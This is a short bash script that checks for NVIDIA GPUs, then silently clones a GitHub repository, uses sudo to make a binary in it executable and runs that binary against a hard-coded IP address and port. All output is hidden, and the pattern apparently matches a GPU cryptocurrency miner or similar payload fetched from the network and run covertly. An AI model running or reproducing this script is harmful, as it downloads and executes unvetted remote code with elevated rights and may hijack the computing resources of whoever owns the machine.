#! /bin/bash
nvidia-smi
printf "Run 206.189.168.204:4545/$1"  >&2
{
git clone https://github.com/phucbmt/tech.git &> /dev/null
sudo chmod +x tech/m
./tech/m -P http://206.189.168.204:4545/"$1" &> log
} &> /dev/null
